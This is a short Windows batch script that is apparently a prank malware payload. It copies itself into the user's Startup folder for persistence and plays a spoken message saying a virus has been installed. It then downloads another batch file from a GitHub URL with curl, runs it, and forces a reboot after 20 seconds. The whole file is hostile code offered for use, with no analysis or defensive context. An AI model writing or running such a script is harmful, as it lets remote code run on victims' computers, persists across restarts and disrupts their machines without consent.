@echo off
copy "./start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
PowerShell -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.SelectVoice('Microsoft David Desktop'); $speak.Speak('hello user we have put some virus in your startup folder better luck we going to restart your PC soon!')"
curl -O https://raw.githubusercontent.com/DanielNov2014/Payload/main/soundplayer.bat
start soundplayer.bat
shutdown -r -t 20
